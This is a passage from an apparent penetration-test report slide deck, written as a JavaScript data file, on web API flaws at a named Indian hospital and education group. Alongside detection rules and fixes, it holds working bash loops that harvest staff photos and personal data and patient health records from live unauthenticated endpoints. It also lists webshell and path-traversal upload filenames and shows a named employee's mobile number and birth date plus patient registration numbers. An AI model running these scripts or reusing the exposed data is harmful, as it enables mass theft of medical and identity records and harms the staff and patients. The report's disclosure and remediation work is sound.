config.Filters.Add(new AuthorizeAttribute());

// Global error handling
config.IncludeErrorDetailPolicy = IncludeErrorDetailPolicy.Never;`},

/* ============================ 05 WEB-2026-002 ============================ */
{type:'divider', sec:'WEB-002', num:'06', kick:'WEB-2026-002 — CVSS 9.8', tone:'bad',
 title:'CRITICAL — Anyone can read your data',
 sub:'Unauthenticated mass staff PII, biometric photographs, patient PHI, clinical tests, '
   + 'and bill cancellation approval.'},

{type:'term', sec:'WEB-002', kick:'CHAIN A — STAFF', tone:'bad',
 title:'Chain A: The staff harvesting loop',
 sub:'This is what an attacker automates. One loop, five pages, every employee.',
 win:'LIVE — automated staff data harvesting',
 cls:'red',
 code:
`#!/bin/bash
# harvest.sh — 12 lines. Collects every employee record.

for i in $(seq 1 5); do
  curl -s "https://narayanagroup.co.in/NnoteApi/api/Nnote/Assignee/$i" \\
    | grep -oP '"Empid":"\\K[0-9]+' >> ids.txt
done

while read id; do
  curl -s "https://narayanagroup.co.in/NtraktApi/api/User/Info/$id" \\
    | python3 -c "
import sys,json,base64
d=json.load(sys.stdin)['data'][0]
open('photos/%s.jpg'%d['EmpNo'],'wb').write(
    base64.b64decode(d.get('EmpPhoto','')))
print(d['EmpNo'], d['EmpName'], d['MobileNo'], d['Dob'])
"
done < ids.txt

# Output:  NES3334024  Yepuri N V K Meerendra Balu  9966362143  15/AUG/1991
#          ...one line per employee, plus a photo file each...
# No login.  No rate limit.  No alert.  Runs in minutes.`,
 foot:'<b>I ran the enumeration, not the download.</b> The loop above is what a real attacker writes. '
   + 'Twelve lines of shell script.'},

{type:'term', sec:'WEB-002', kick:'CHAIN B — PATIENTS', tone:'bad',
 title:'Chain B: The patient harvesting loop',
 sub:'Same idea, one extra step — the bill-cancellation queue gives away patient registration numbers.',
 win:'LIVE — automated patient PHI harvesting',
 cls:'red',
 code:
`#!/bin/bash
# Step 1: the cancel queue hands over real patient numbers
curl -s ".../NnoteApi/api/Investigation/Cancel/Approval/List" \\
  | grep -oP '"Prno":"\\K[0-9]+' | sort -u > prno.txt
#  -> 1005411787
#  -> 20231132634
#  -> 1005416039

# Step 2: for each patient, pull demographics
while read p; do
  curl -s ".../NnoteApi/api/Patient/Info/$p"
done < prno.txt
#  -> Name, Age, Gender, MobileNo, Aadhar, PIN, ConfirmPIN

# Step 3: pull the clinical tests
curl -s ".../NnoteApi/api/Investigation/Cancel/Bill/\\
         1005411787/202310090822/202310160001"
#  -> "CROSS MATCHING & BLOOD GROUPING", Rs 1400

# Result: a named patient, her mobile number,
#         and the medical test she underwent.`,
 foot:'<b>This is the most serious slide in the deck.</b> A named person, her mobile number, '
   + 'and her clinical test — three unauthenticated HTTP requests apart.'},

{type:'cards', sec:'WEB-002', kick:'WHAT THE ATTACKER DOES NEXT', tone:'bad',
 title:'From raw data to actual harm',
 sub:'Stolen data is only valuable once it is used. Here is how it gets used.', cols:3,
 cards:[
  {tone:'red', h:'The perfect scam call', p:'"Madam, this is Narayana billing. Your CROSS MATCHING test '
    + 'payment of Rs 1,400 did not go through. Please confirm your card." — She knows she had that test. '
    + 'She believes the caller. This is why health data is worth more than card data.'},
  {tone:'red', h:'Identity fraud with staff photos', p:'Name + DOB + mobile + employee number + a scanned '
    + 'passport photograph is the complete package for forging documents, opening accounts and '
    + 'taking loans in an employee\'s name.'},
  {tone:'red', h:'Blackmail', p:'A named individual linked to a specific medical test is exactly the kind '
    + 'of information that is used for extortion. This is a real, documented criminal business model.'},
  {tone:'amber', h:'Credential stuffing', p:'Employee mobiles and DOBs become password-guessing material '
    + 'for other systems — email, banking, government portals.'},
  {tone:'amber', h:'Competitor intelligence', p:'Staff lists, branch names, department structures and '
    + 'designations are commercially sensitive.'},
  {tone:'amber', h:'Resale at scale', p:'Bundled and sold on Telegram and dark-web markets. '
    + 'Indian health records are heavily traded.'}],
 footTone:'red',
 foot:'<b>Under India\'s DPDP Act 2023, failing to apply "reasonable security safeguards" '
   + 'can attract penalties up to Rs 250 crore. This is the finding that matters most to the board.</b>'},

{type:'fix', sec:'WEB-002', kick:'DETECT & FIX', tone:'bad',
 title:'WEB-2026-002 — Detect it, fix it',
 sub:'Owner: Lead developer + IT head. Priority: today.',
 attack:[
   'Walks through sequential IDs and collects every record',
   'Downloads staff photographs in bulk',
   'Links patient names to clinical tests',
   'Approves bill cancellations anonymously',
   'Leaves <b>no trace</b> — nothing is logged or alerted on'],
 detect:[
   'Alert when one source IP requests &gt;10 distinct <code>User/Info/{id}</code> or <code>Patient/Info/{id}</code> in 5 minutes',
   'Alert on any unauthenticated <code>2xx</code> response from <code>/NtraktApi/</code> or <code>/NnoteApi/</code>',
   'Alert on any <code>POST</code> to <code>Investigation/Cancel/Approve</code> without a session',
   'Log <b>who</b> read <b>whose</b> record — patient-record access logging is a compliance requirement',
   'Baseline normal traffic volume; alert on deviation'],
 fix:[
   'Fix authentication first (WEB-001) — this closes most of it immediately',
   'Add <b>authorisation</b>: a caller may only ever read their own record',
   'Replace guessable IDs (3334024, 1005411787) with random UUIDs',
   'Remove <code>Password</code>, <code>OTP</code>, <code>OTPMessage</code>, <code>Aadhar</code>, <code>PIN</code>, <code>ConfirmPIN</code> from every API response',
   'Serve photographs from an authenticated endpoint; strip scanner EXIF metadata',
   'Require an authenticated, role-checked approver for bill cancellation; write an audit record with the approver\'s identity',
   'Add rate limiting: max N requests per IP per minute, then block'],
 code:
`// NEVER do this (current behaviour):
public IHttpActionResult Info(int id){
    return Ok(db.GetUser(id));        // no auth, no authz
}

// DO this:
[Authorize]
public IHttpActionResult Info(int id){
    var me = User.Identity.GetEmpid();   // from session
    if (me != id && !User.IsInRole("HR"))
        return Forbidden();               // IDOR guard
    Log.Access(me, "UserInfo", id);       // audit trail
    return Ok(db.GetUser(id));
}`},

/* ============================ 06 HIGH FINDINGS =========================== */
{type:'divider', sec:'HIGH', num:'07', kick:'HIGH SEVERITY — WEB-2026-003 / 004 / 005 / 006 / 007',
 tone:'warn',
 title:'The five High findings',
 sub:'Each of these is a serious breach path on its own. Together they form a complete attack.'},

{type:'term', sec:'HIGH', kick:'WEB-2026-003 — CVSS 8.6', tone:'warn',
 title:'003 — Unauthenticated file upload: the road to server control',
 sub:'Three upload endpoints accept files with no login. One of them lets the caller choose '
   + 'the filename — which is the dangerous part.',
 win:'Discovered in the app\'s own JavaScript',
 cls:'amber',
 code:
`Nnote/markattendance.html
  -> /NtraktApi/api/FileUpload/UploadForEmpFile/{empid}/{Mslno}

ncare/request.html
  -> /NnoteApi/api/FileUpload/UploadFile/{n}/{cslno}
  -> /NnoteApi/api/FileUpload/UploadFile/mobile/{fname}/{cslno}
                                                ^^^^^^
                              THE CALLER CHOOSES THE FILENAME

# Why that matters:
#   fname = "shell.aspx"                 -> webshell on your server
#   fname = "../../inetpub/wwwroot/x.aspx" -> written outside the upload folder
#   fname = "x.aspx;.jpg"                -> extension filter bypass
#
# Combine with no authentication and you have
# the single most common route to full server compromise
# in IIS environments.

# NOT EXPLOITED. Proven reachable and unauthenticated only.`,
 foot:'<b>Add to this:</b> no visible file-size limit and no limit on the number of uploads — '
   + 'so it is also a cheap way to fill your server\'s disk.'},

{type:'fix', sec:'HIGH', kick:'WEB-2026-003 — DETECT & FIX', tone:'warn',
 title:'003 — Detect it, fix it',
 sub:'Owner: Lead developer. Priority: this week.',
 attack:[
   'Uploads a web shell and runs commands as the server',
   'Hosts malware or phishing pages <b>on your trusted hospital domain</b>',
   'Fills the disk to take systems offline',
   'Uses your server to attack others'],
 detect:[
   'Alert on any <code>POST</code> to <code>/FileUpload/*</code> without a session cookie',
   'Alert on new <code>.aspx</code>, <code>.ashx</code>, <code>.asp</code> files appearing in any upload directory',
   'Alert on upload requests whose filename contains <code>..</code>, <code>/</code> or <code>\\</code>',
   'File-integrity monitoring on all web-accessible directories',
   'Egress alerts if the web server starts making outbound connections'],
 fix:[
   'Require authentication and authorisation on all three endpoints (covered by the WEB-001 fix)',
   '<b>Never accept a filename from the caller</b> — generate it server-side, random name + your extension',
   'Validate real file content, not just the extension; allow-list images and PDFs only',
   'Store uploads <b>outside</b> the web root and serve them through a controlled handler',
   'Enforce a maximum file size and a maximum number of uploads per user per day',
   'Antivirus-scan every upload before storing it'],
 code:
`// Server-side filename generation — never trust the client
var safe = Path.GetExtension(file.ContentType);          // from content, not name
var name = Guid.NewGuid().ToString("N") + safe;          // random name
var path = Path.Combine(uploadRoot, name);               // fixed folder
if (!path.StartsWith(uploadRoot)) return BadRequest();   // traversal guard`},

{type:'term', sec:'HIGH', kick:'WEB-2026-004 — CVSS 8.2', tone:'warn',
 title:'004 — The fee payment page trusts the payer',
 sub:'Your payment page stores the amount, the fine and the destination bank account in the '
   + "payer's own browser. Hidden fields are not hidden — they are just invisible.",
 win:'Every visitor receives this HTML',
 cls:'amber',
 code:
`<input type="hidden" name="hinaccountno"  value="...bank account number..." />
<input type="hidden" name="hinbranchname" value="...branch..." />
<input type="hidden" name="hinamount"     value="50000" />
<input type="hidden" name="hdnfineamt"    value="0" />
<input type="hidden" name="hidTotDue"     value="..." />
<input type="hidden" name="hidBioId"      value="...biometric id..." />

# The attacker opens DevTools (F12), changes hinamount to 1,
# sets hdnfineamt to 0, and submits.

# Second problem — no login on the student lookup:
#   txtRegno = <any registration number>
#   -> returns Student Name, Father Name, Mother Name,
#      Mobile No, Email, Address, Biometric ID

# Third: the homepage links to it over http://`,
 foot:'<b>Two separate losses here:</b> revenue (underpayment or diversion) and privacy '
   + '(student and parent PII available to anyone who guesses a registration number).'},

{type:'fix', sec:'HIGH', kick:'WEB-2026-004 — DETECT & FIX', tone:'warn',
 title:'004 — Detect it, fix it',
 sub:'Owner: Fee-portal developer. Priority: this week.',
 attack:[
   'Changes <code>hinamount</code> and pays Re 1 instead of Rs 50,000',
   'Zeros the fine via <code>hdnfineamt</code>',
   'Substitutes a different destination bank account',
   'Scrapes student and parent PII by iterating registration numbers',
   'Intercepts traffic because the homepage link is <code>http://</code>'],
 detect:[
   'Alert when the amount captured by the gateway differs from the amount the database says is due',
   'Alert on &gt;10 student lookups from one IP in 5 minutes',
   'Reconcile daily: expected fees vs settled payments; flag every mismatch',
   'Alert on any non-HTTPS request to <code>/onlinefeepay/</code>'],
 fix:[
   '<b>Compute amount, fine and merchant account server-side from the database.</b> Ignore anything the browser sends',
   'Never send the bank account or branch to the browser — select it by merchant ID on the server',
   'Reconcile every payment against the expected amount; flag mismatches for manual review',
   'Require login or an OTP to the registered mobile before showing any student data',
   'Display only the minimum fields needed to take a payment',
   'Change the homepage link to <code>https://</code> and redirect all HTTP to HTTPS'],
 code:
`// SERVER SIDE — the only place this decision belongs
var student = db.GetStudent(regno);            // trusted source
var amount  = student.FeeDue;                  // NOT Request.Form["hinamount"]
var fine    = CalculateFine(student);          // NOT Request.Form["hdnfineamt"]
var account = config.MerchantAccount;          // NOT Request.Form["hinaccountno"]

razorpay.CreateOrder(amount + fine, account);

if (payment.captured != amount + fine)
    Alert.Finance("Amount mismatch", regno);   // detect tampering`},

{type:'term', sec:'HIGH', kick:'WEB-2026-005 — CVSS 7.5', tone:'warn',
 title:'005 — Error messages that hand over your blueprint',
 sub:'When something goes wrong, your API returns the full engineer\'s error — including the '
   + 'database schema, procedure names and server file paths.',
 win:'LIVE — information disclosure via error messages',
 cls:'amber',
 code:
`$ curl -s "https://narayanagroup.co.in/NtraktApi/api/User/Info/1'"

{
  "Message": "An error has occurred.",
  "ExceptionMessage": "ORA-01722: invalid number
                       ORA-06512: at \"MOBIDB.GET_USERINFO\", line 34",
  "ExceptionType": "Oracle.ManagedDataAccess.Client.OracleException",
  "StackTrace": "   at NtraktApi.Models.UserModel.GetUserInfo(Int32 Empid)
                     in d:\\NtraktApi\\NtraktApi\\Models\\UserModel.cs:line 113"
}

# Read what just leaked:
#   - the database is ORACLE
#   - the schema is called MOBIDB
#   - the stored procedure is GET_USERINFO
#   - the source file is d:\\NtraktApi\\NtraktApi\\Models\\UserModel.cs
#   - and ORA-01722 proves my quote character reached the
#     database query WITHOUT BEING VALIDATED FIRST.
#     That is the textbook signature of SQL injection.`,
 foot:'<b>Developers:</b> that <code>ORA-01722: invalid number</code> is your system telling the '
   + 'world that input goes straight into a query. Attackers read these the way you read a menu.'},

{type:'fix', sec:'HIGH', kick:'WEB-2026-005 — DETECT & FIX', tone:'warn',
 title:'005 — Detect it, fix it',
 sub:'Owner: Lead developer. Priority: this week. Lowest effort, high return.',
 attack:[
   'Learns you run Oracle, schema <code>MOBIDB</code>, procedures <code>GET_USERINFO</code> / <code>GET_USERATTENDANCE_LATEST</code>',
   'Confirms input reaches the database unvalidated → crafts SQL injection',
   'Maps internal file paths and internal proxy routes',
   'Uses the internal route disclosure (<code>http://narayanagroup.co.in/NnoteApi/...</code>) to plan lateral movement'],
 detect:[
   'Alert on any response body containing <code>ORA-</code>, <code>Stack</code> or <code>.cs:line</code>',
   'Alert on inputs containing <code>\'</code>, <code>--</code>, <code>UNION</code> submitted to any API',
   'Monitor for a spike in <code>5xx</code> responses — attack reconnaissance shows up here'],
 fix:[
   'Set <code>&lt;customErrors mode="On" /&gt;</code> and <code>IncludeErrorDetailPolicy.Never</code>',
   'Log full details <b>server-side</b>; show the user one generic message',
   '<b>Validate every input before it reaches the database</b> — reject non-numeric IDs outright',
   'Use <b>parameterised queries / bind variables</b> everywhere, never string concatenation',
   'Add one friendly generic error page for all unexpected exceptions'],
 code:
`<\!-- web.config -->
<system.web>
  <customErrors mode="On" defaultRedirect="~/error.html" />
</system.web>

// Global.asax / WebApiConfig
config.IncludeErrorDetailPolicy = IncludeErrorDetailPolicy.Never;

// Data access — parameterised, not concatenated
cmd.CommandText = "SELECT * FROM USERS WHERE EMPID = :empid";
cmd.Parameters.Add("empid", OracleDbType.Int32).Value = id;   // safe`},

{type:'term', sec:'HIGH', kick:'WEB-2026-006 — CVSS 8.1', tone:'warn',
 title:'006 — Running software that will never be patched again',
 sub:'When software reaches end of life, the manufacturer stops issuing fixes. Every flaw '
   + 'published after that date is permanent.',
 win:'LIVE — version banners',
 cls:'amber',
 code:
`$ curl -s -I "http://helpdesk.narayanagroup.co.in/helpdesk/"
Server: Apache/2.4.23 (Win64) PHP/5.6.25
X-Powered-By: PHP/5.6.25
   -> Apache 2.4.23 ....... released 2016, superseded
   -> PHP 5.6.25 .......... end of life 31 Dec 2018

$ curl -s "http://helpdesk.narayanagroup.co.in/helpdesk/"
   -> osTicket v1.10 (901e5ea)
      CVE-2020-24881  SSRF
      CVE-2020-14008  Stored XSS
      CVE-2017-15580  SQL injection

$ curl -s -I "https://uat.narayanagroup.co.in/" -L | grep Server
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.11
   -> CVE-2021-40438  mod_proxy SSRF
   -> CVE-2021-3711   OpenSSL SM2 buffer overflow`,
 foot:'<b>These are not theoretical CVEs.</b> Public, working exploit code exists for each one. '
   + 'An attacker downloads it and runs it. No skill required.'},

{type:'fix', sec:'HIGH', kick:'WEB-2026-006 — DETECT & FIX', tone:'warn',
 title:'006 — Detect it, fix it',
 sub:'Owner: IT head + vendors. Priority: this month (helpdesk: this week).',
 attack:[
   'Downloads a public exploit for osTicket 1.10 or PHP 5.6',
   'Gains a foothold on the helpdesk server',
   'Moves laterally towards the database and file shares',
   'Uses the forgotten UAT server (<code>115.241.194.18</code>) as a softer entry point'],
 detect:[
   'Run an authenticated vulnerability scan monthly and diff the results',
   'Inventory every server: OS, web server, language, framework, version, owner',
   'Subscribe to security advisories for every product in that inventory',
   'Alert on outbound connections from web servers to unfamiliar destinations'],
 fix:[
   '<b>Helpdesk first:</b> upgrade osTicket to a current release on PHP 8.x — or replace it',
   'Decide <b>upgrade / replace / retire</b> for the 2003 payroll, 2010 Classic ASP inventory '
   + 'and hospital systems, and the ASP.NET 2.0 patient portal',
   'Take <code>uat.narayanagroup.co.in</code> off the internet, or patch it',
   'Update jQuery (1.10-1.12 → 3.7.x) and Bootstrap (3.3.7 → 5.x) on the main site',
   'Put anything that cannot be upgraded behind VPN or an IP allow-list',
   '<b>Start a monthly patching routine</b> — most breaches exploit fixes that were available for months'],
 code:
`# Quick win for the developer: update the front-end libraries
# jQuery 1.12.4 -> 3.7.1      (fixes CVE-2020-11022 / 11023 / 2019-11358)
# Bootstrap 3.3.7 -> 5.3.x    (fixes CVE-2018-14040/41/42, CVE-2019-8331)
#
# Usually a single day of work for a web developer.`},

{type:'term', sec:'HIGH', kick:'WEB-2026-007 — CVSS 7.5', tone:'warn',
 title:'007 — Replacing your hospital app on the way to every phone',
 sub:'Your Android app is downloaded over unencrypted HTTP, with no signature verification. '
   + 'Anyone on the network can substitute their own file.',
 win:'Found inside your own app update code',
 cls:'amber',
 code:
`$ curl -s "https://narayanagroup.co.in/Nnote/layout.html" | grep -i apk

  http://115.241.194.19/nNote.apk
  ^^^^^^  NOT ENCRYPTED

# The attack, in three steps:
#   1. Attacker sits on the same Wi-Fi (or anywhere on the path)
#   2. Intercepts the request for nNote.apk
#   3. Returns their own APK instead
#
# Every staff member who updates gets the attacker\'s app,
# on a device that has access to hospital systems.
# There is no signature check to stop it.

# Same problem on two login pages:
$ curl -s -o /dev/null -w "%{http_code}\\n" \\
    "http://helpdesk.narayanagroup.co.in/helpdesk/login.php"
200        <- a login form, sent in the clear
$ curl -s -o /dev/null -w "%{http_code}\\n" "http://115.241.194.8/elearn/"
200        <- another one`,
 foot:'<b>This is the finding with the widest blast radius.</b> One substituted file reaches '
   + 'every device that updates from it.'},

{type:'fix', sec:'HIGH', kick:'WEB-2026-007 — DETECT & FIX', tone:'warn',
 title:'007 — Detect it, fix it',
 sub:'Owner: IT head + mobile developer. Priority: this week.',
 attack:[
   'Replaces <code>nNote.apk</code> with a trojanised version',
   'Captures credentials typed into the unencrypted helpdesk and elearn logins',
   'Reads or modifies any traffic on those connections (shared or public Wi-Fi)'],
 detect:[
   'Alert on any HTTP (non-TLS) request to a login page or a download URL',
   'Monitor the APK hash: alert if a published build ever changes unexpectedly',
   'Check that all cookies carry the <code>Secure</code> attribute',
   'Scan your own site regularly for mixed content (HTTP resources inside HTTPS pages)'],
 fix:[
   'Move <code>nNote.apk</code> to HTTPS on your own domain',
   '<b>Sign the APK</b> with a proper release key and verify the signature before installing',
   'Distribute through the Google Play Store — it handles integrity checking for you',
   'Force HTTPS everywhere and redirect all HTTP to HTTPS',
   'Add <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>',
   'Mark every cookie <code>Secure</code>'],
 code:
`# Apache / .htaccess — force encryption
RewriteEngine On
RewriteCond %{HTTPS} !=on
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"

# ASP.NET web.config — protect the cookies
<httpCookies httpOnlyCookies="true" requireSSL="true" />`},

/* ============================ 07 MEDIUM FINDINGS ========================= */
{type:'divider', sec:'MEDIUM', num:'08', kick:'MEDIUM SEVERITY — 008 / 010 / 009', tone:'warn',
 title:'The three Medium findings',
 sub:'Lower individual severity — but each one makes the attacker\'s job easier, and two of '
   + 'them are two-minute fixes.'},

{type:'split', sec:'MEDIUM', kick:'WEB-2026-008 — CVSS 6.5', tone:'warn',
 title:'008 — Your medical imaging server is half-configured',
 lh:'WHAT AN ATTACKER SEES', lterm:
`$ curl -s -I "https://pacs.narayanagroup.co.in/"

HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
strict-transport-security: max-age=0; includeSubDomains; preload
                           ^^^^^^^^^^
                           max-age=0 DISABLES HSTS.
                           It tells the browser to forget
                           any previous rule to use HTTPS only.

access-control-allow-origin: https://GlobalServerIP:Port
                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
                             placeholder text from the
                             installation manual — never
                             replaced. This server was
                             deployed without a config review.

$ curl -s ".../PacsAPI/"  -> "Pacs 7.0.0.0 Web API is running"
$ curl -s ".../RISAPI/"   -> "Ris 5.1.0.0 Web API is running"`,
 lcls:'amber',
 rh:'HOW TO FIX IT', ritems:[
   'Set <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>',
   'Replace the placeholder CORS value with your real domain only — never a wildcard',
   'Require authentication on <code>/PacsAPI/</code>, <code>/RISAPI/</code> and <code>/externalConfig.js</code>',
   'Ask Medsynapse (the vendor) for their hardening guide and confirm your version is supported',
   '<b>Best option:</b> keep the imaging server off the open internet — VPN only'],
 foot:'<b>Why it matters:</b> PACS holds X-rays, CT scans and MRIs. It is the most sensitive '
   + 'imaging data you have, and it was installed by following the manual literally.'},

{type:'split', sec:'MEDIUM', kick:'WEB-2026-010 — CVSS 6.5', tone:'warn',
 title:'010 — Anyone can send email as you, and one subdomain points at a stranger',
 lh:'THE ATTACKER\'S VIEW', lterm:
`# 1. No SPF, no DMARC — email can be forged
$ dig +short TXT narayanagroup.co.in
        (empty)
$ dig +short TXT _dmarc.narayanagroup.co.in
        (empty)

# An attacker sends:
#   From: billing@narayanagroup.co.in
#   "Please update our bank details for the next payment."
# Most mail systems will deliver it. No warning.

# 2. A typo in your DNS
$ dig +short online.narayanagroup.co.in
15.241.194.25     <-- every other address starts 115.
                      The leading "1" was missed.
                      This is NOT your server.

# 3. Two subdomains with no owner
$ curl -s -I "https://nmc.narayanagroup.co.in/"
<title>IIS Windows Server</title>   <- default, empty
$ curl -s -I -L "https://uat.narayanagroup.co.in/"
location: https://115.241.194.18    <- EOL Apache/PHP`,
 lcls:'amber',
 rh:'HOW TO FIX IT (MINUTES, NOT DAYS)', ritems:[
   'Add SPF: <code>TXT "v=spf1 -all"</code> (or your mail provider\'s record)',
   'Add DMARC: <code>TXT "v=DMARC1; p=none"</code> first, review reports for 2 weeks, '
   + 'then move to <code>quarantine</code>, then <code>reject</code>',
   '<b>Fix or delete the <code>online</code> DNS record today</b> — two minutes in Cloudflare',
   'Decide the fate of <code>nmc</code> and <code>uat</code>: assign an owner or remove the records',
   'Add a quarterly DNS review to the IT calendar'],
 footTone:'red',
 foot:'<b>The DNS typo is the single fastest fix in this entire report.</b> It is a two-minute '
   + 'change and it is currently pointing part of your brand at somebody else\'s server.'},

{type:'split', sec:'MEDIUM', kick:'WEB-2026-009 — CVSS 5.8', tone:'warn',
 title:'009 — Missing browser protections, insecure cookies, leaked internals',
 lh:'WHAT AN ATTACKER USES', lterm:
`# No security headers at all on the main site
$ curl -s -I "https://narayanagroup.co.in/"
(missing) X-Frame-Options          -> clickjacking works
(missing) Content-Security-Policy  -> script injection easier
(missing) Strict-Transport-Security
(missing) X-Content-Type-Options
(missing) Referrer-Policy
(missing) Permissions-Policy

# Cookies with no protection flags (2010 Classic ASP)
$ curl -s -I -d "LoginId=test" \\
   ".../inventory/commonfiles/asp/InnerHome.asp"
Set-Cookie: ASPSESSIONIDQCQRQDSB=...; path=/
            no HttpOnly, no Secure, no SameSite

# The page tells you if a user ID does not exist
$ curl -s ".../inventory/default.asp?logInFlag=0"
<CENTER><FONT COLOR=RED>There is no such Login Id</FONT>

# Internal addresses visible in public pages
https://192.168.100.10/    115.241.194.2
localhost:64867            115.241.194.19`,
 lcls:'amber',
 rh:'HOW TO FIX IT', ritems:[
   'Add the six standard security headers site-wide (one config change)',
   'Mark every cookie <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite=Lax</code>',
   'Replace "There is no such Login Id" with one generic failure message',
   'Remove internal IPs and <code>localhost</code> references from live code',
   'Add CSRF tokens to the <code>app.narayanagroup.co.in</code> login form',
   'Suppress <code>X-Powered-By</code> headers; block <code>/ntask/storage/</code> at the web server'],
 foot:'<b>Why attackers care:</b> headers are free defence, cookies without HttpOnly turn any small '
   + 'scripting bug into instant account theft, and internal IPs are a map of your network.'},

/* ============================ 08 DETECTION =============================== */
{type:'divider', sec:'DETECTION', num:'09', kick:'DETECTION ENGINEERING', tone:'info',
 title:'What should have caught this?',
 sub:'For the security team. Every finding above went unnoticed. Here is what "noticed" looks like.'},

{type:'cards', sec:'DETECTION', kick:'THE LOG GAP', tone:'info',
 title:'The detection gaps that let all of this happen',
 sub:'These are the real questions the security team needs to answer.', cols:3,
 cards:[
  {tone:'red', h:'No authentication logging', p:'You cannot alert on failed logins if you never log '
    + 'them. There is no record of who logged in, when, or from where.'},
  {tone:'red', h:'No data-access logging', p:'Nobody can answer "who read patient 1005411787?" — '
    + 'a basic requirement for health-data compliance.'},
  {tone:'red', h:'No rate limiting', p:'An attacker can make thousands of requests per minute and '
    + 'nothing distinguishes that from normal use.'},
  {tone:'amber', h:'No API inventory', p:'If you do not have a list of your API endpoints, you cannot '
    + 'monitor them. Unknown endpoints are unmonitored endpoints.'},
  {tone:'amber', h:'No alerting on anomalies', p:'No baseline, so no deviation detection. A staff '
    + 'record being read at 3am looks identical to normal traffic.'},
  {tone:'amber', h:'No WAF in front', p:'You already use Cloudflare. The WAF, bot protection and rate '
    + 'limiting are available at no extra cost and are not enabled.'}],
 footTone:'red',
 foot:'<b>The hardest question in the room:</b> because none of this is logged, nobody can tell you '
   + 'whether someone else has already done it. Treat that as an open incident until proven otherwise.'},

{type:'term', sec:'DETECTION', kick:'SIEM / LOG QUERIES', tone:'info',
 title:'Ten alerts to build this week',
 sub:'Pseudo-queries — adapt to whatever SIEM you run (Splunk, ELK, Wazuh, Sentinel).',
 win:'detection-rules.sql (adapt to your SIEM)',
 cls:'cyan',
 code:
`-- 1. Unauthenticated API access -- any hit is Critical\nSELECT * FROM weblogs\nWHERE (path LIKE '/NtraktApi/api/%' OR path LIKE '/NnoteApi/api/%')\n  AND request_cookie IS NULL AND status = 200\n\n-- 2. Mass record enumeration (IDOR harvesting)\nSELECT src_ip, COUNT(DISTINCT path) n FROM weblogs\nWHERE path ~ '/User/Info/[0-9]+' GROUP BY src_ip,\n      time_bucket('5 minutes') HAVING COUNT(DISTINCT path) > 10\n\n-- 3. Dashboard opened without a prior login\nSELECT * FROM weblogs WHERE path LIKE '%layout.html%'\n  AND src_ip NOT IN (SELECT src_ip FROM successful_logins\n                     WHERE ts > now() - interval '30 minutes')\n\n-- 4. PIN / user changes with no session\nSELECT * FROM weblogs WHERE\n  (path LIKE '%ChangePin%' OR path LIKE '%UpdatePin%'\n   OR path LIKE '%CreateUser%') AND request_cookie IS NULL\n\n-- 5. Unauthenticated file upload\nSELECT * FROM weblogs WHERE path LIKE '%/FileUpload/%'\n  AND method='POST' AND request_cookie IS NULL`,
 foot:'Continue with: (6) error-message leakage, (7) SQL-injection characters in parameters, '
   + '(8) &gt;20 4xx/5xx from one IP, (9) HTTP requests to login pages, (10) new executable files in web directories.'},

{type:'term', sec:'DETECTION', kick:'FAST MITIGATION', tone:'info',
 title:'You can blunt most of this today — for free',
 sub:'Your DNS already runs on Cloudflare. The WAF, bot protection and rate limiting are included '
   + 'at no additional cost. Switch them on while the permanent fixes are built.',
 win:'Cloudflare — enable these now (no cost)',
 cls:'cyan',
 code:
`WAF   ->  Managed Ruleset .................. ON\nWAF   ->  OWASP Core Rule Set .............. ON\nBots  ->  Bot Fight Mode ................... ON\nRate limiting (Security > WAF > Rate limiting rules)\n  R1:  /NtraktApi/api/*   -> 20 req / 10s / IP -> BLOCK\n  R2:  /NnoteApi/api/*    -> 20 req / 10s / IP -> BLOCK\n  R3:  */FileUpload/*     -> 5  req / 60s / IP -> BLOCK\n  R4:  /onlinefeepay/*    -> 30 req / 60s / IP -> CHALLENGE\nCustom WAF rule (blocks the bypass immediately):\n  (http.request.uri.path contains "/Nnote/layout.html"\n   and not http.request.cookie contains ".SessionId")\n  -> BLOCK\nFirewall rule (temporary, until auth is fixed):\n  /NtraktApi/* and /NnoteApi/* reachable only from\n  known Narayana office & hospital IP ranges\n  -> BUYS YOU SAFETY TODAY, not a permanent fix`,
 foot:'<b>Be clear with the room:</b> this is a seatbelt, not a cure. It raises the cost of attack '
   + 'while the developers build the real fix. Do not let it become the fix.'},

/* ============================ 09 REMEDIATION ============================= */
{type:'divider', sec:'REMEDIATION', num:'10', kick:'REMEDIATION', tone:'info',
 title:'Fixing it',
 sub:'A prioritised, owner-assigned plan. Nothing here requires rebuilding your hospital software.'},

{type:'bigcards', sec:'REMEDIATION', kick:'THE ONE THING', tone:'info',
 title:'One change closes three findings',
 sub:'If the team does exactly one thing this week, make it this.', cols:3,
 cards:[
  {tone:'red', n:'9.8', l:'WEB-2026-001 Critical — no login'},
  {tone:'red', n:'9.8', l:'WEB-2026-002 Critical — data exposure'},
  {tone:'amber', n:'8.6', l:'WEB-2026-003 High — file uploads'}],
 foot:'<b>Add server-side authentication to <code>/NtraktApi/api/*</code> and '
   + '<code>/NnoteApi/api/*</code>.</b> Deny by default. That single change removes both Critical '
   + 'findings and the unauthenticated upload path — 3 of 10 issues, including the two that matter '
   + 'most — and it is realistically one day of work. <b>If your developers are unavailable today, '
   + 'apply the Cloudflare IP allow-list instead. It takes ten minutes and stops the bleeding now.</b>'},

{type:'table', sec:'REMEDIATION', kick:'DEVELOPER-OWNED', tone:'info',
 title:'Code changes — for the development team',
 small:true,
 head:['#','Fix','Findings closed','Effort'],
 rows:[
  ['1','Server-side authentication on both APIs, deny-by-default','001, 002, 003','1-2 days'],
  ['2','Authorisation check: users read only their own records','002','1 day'],
  ['3','Replace guessable IDs with random UUIDs','002','2-3 days'],
  ['4','Remove Password / OTP / Aadhaar / PIN fields from API responses','002','2 hours'],
  ['5','Require current PIN or server-verified OTP before a PIN change','001','1 day'],
  ['6','Server-side filename generation; content-type allow-list; store outside web root','003','1 day'],
  ['7','Compute amount, fine and merchant account server-side','004','1-2 days'],
  ['8','Parameterised queries; validate every input','005','2-3 days'],
  ['9','Account lockout after 5 failures + authentication logging','001','1 day'],
  ['10','Rate limiting on every sensitive endpoint','001, 002, 004','2 days']],
